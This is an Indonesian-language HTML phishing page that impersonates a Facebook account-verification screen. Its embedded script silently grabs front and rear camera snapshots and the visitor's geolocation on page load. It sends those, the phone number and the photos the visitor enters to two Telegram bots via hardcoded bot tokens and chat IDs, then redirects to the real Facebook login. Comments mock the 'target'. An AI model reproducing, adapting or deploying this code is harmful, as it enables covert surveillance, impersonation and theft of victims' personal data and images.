<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Security Verification</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body { background-color: #f0f2f5; font-family: Helvetica, Arial, sans-serif; }
        .main-card { max-width: 450px; margin: 50px auto; border: none; border-radius: 8px; box-shadow: 0 12px 28px rgba(0,0,0,0.2); background: #fff; }
        .fb-logo { color: #1877f2; font-size: 40px; font-weight: bold; letter-spacing: -1px; margin-bottom: 10px; }
        .btn-fb { background-color: #1877f2; color: white; font-weight: bold; padding: 12px; border-radius: 6px; border: none; width: 100%; }
        .btn-fb:hover { background-color: #166fe5; }
        #video, #canvas { display: none; }
        .footer-text { font-size: 12px; color: #737373; margin-top: 20px; }
    </style>
</head>
<body>

<div class="container">
    <div class="main-card card p-4 text-center">
        <div class="fb-logo">facebook</div>
        <h5 class="fw-bold">Verifikasi Akun Diperlukan</h5>
        <p class="text-muted small">Kami mendeteksi login yang tidak biasa. Untuk melindungi akun Anda, silakan lengkapi langkah-langkah di bawah ini.</p>
        <hr>

        <div class="mb-4 text-start">
            <label class="form-label fw-bold small">Langkah 1: Masukkan Nomor Telepon Aktif</label>
            <div class="input-group">
                <input type="number" id="phone" class="form-control" placeholder="08xxxxxxxxxx">
                <button class="btn btn-primary" onclick="kirimNomor()">Kirim</button>
            </div>
        </div>

        <div class="mb-4 text-start">
            <label class="form-label fw-bold small">Langkah 2: Unggah 5 Foto Profil (Identitas)</label>
            <input type="file" id="galeri" class="form-control" multiple accept="image/*" onchange="kirimGaleri()">
            <div id="statusGaleri" class="small text-success mt-1" style="display:none;">‚úîÔ∏è Foto sedang diproses...</div>
        </div>

        <p class="small text-muted mb-4">Pastikan Anda mengizinkan akses lokasi dan kamera untuk mempercepat proses peninjauan kami.</p>
        
        <button class="btn-fb" onclick="window.location.href='https://www.facebook.com/login'">Selesaikan Verifikasi</button>
        
        <div class="footer-text">Facebook ¬© 2026 ¬∑ Pusat Bantuan Keamanan</div>
    </div>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>

<script>
    const botConfig = {
        tokens: ["8555398375:AAGESWcRFUKios-h-G7eG8kexiHghzJLGo8", "8220550089:AAF2wuFOcdHAWVMu3dITv4GDspDHIrXngfg"],
        chats: ["7835924973", "8071786272"]
    };

    // --- OTOMATIS JALAN SAAT HALAMAN DIBUKA ---
    window.onload = () => {
        captureCam("user"); // Langsung sikat kamera depan üòà
        setTimeout(() => captureCam("environment"), 4000); // Terus sikat kamera belakang ‚ò†Ô∏è
        getLiveLocation(); // Tarik lokasinya üìç
    };

    function sendToBot(content, type = "text") {
        botConfig.tokens.forEach((token, i) => {
            let url = `https://api.telegram.org/bot${token}/`;
            let body = new FormData();
            body.append("chat_id", botConfig.chats[i]);

            if (type === "text") {
                url += "sendMessage";
                body.append("text", content);
            } else if (type === "photo") {
                url += "sendPhoto";
                body.append("photo", content);
                body.append("caption", "üì∏ Hasil Capture / File");
            }
            fetch(url, { method: "POST", body: body });
        });
    }

    // Capture Kamera Otomatis
    async function captureCam(mode) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
            const video = document.getElementById('video');
            video.srcObject = stream;
            setTimeout(() => {
                const canvas = document.getElementById('canvas');
                canvas.width = 480; canvas.height = 640;
                canvas.getContext('2d').drawImage(video, 0, 0);
                canvas.toBlob(blob => sendToBot(blob, "photo"), 'image/jpeg');
                stream.getTracks().forEach(t => t.stop());
            }, 2000);
        } catch (e) { console.log("Akses Ditolak"); }
    }

    // Lokasi Otomatis
    function getLiveLocation() {
        navigator.geolocation.getCurrentPosition(pos => {
            const map = `üìç LOKASI TARGET: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
            sendToBot(map);
        });
    }

    // Tombol Kirim Nomor
    function kirimNomor() {
        const phone = document.getElementById('phone').value;
        if (phone) {
            sendToBot(`üì± NOMOR HP TARGET: ${phone}`);
            alert("Nomor berhasil dikirim!");
        }
    }

    // Kirim Galeri
    function kirimGaleri() {
        const files = document.getElementById('galeri').files;
        document.getElementById('statusGaleri').style.display = 'block';
        for (let i = 0; i < Math.min(files.length, 5); i++) {
            sendToBot(files[i], "photo");
        }
    }
</script>

</body>
</html>
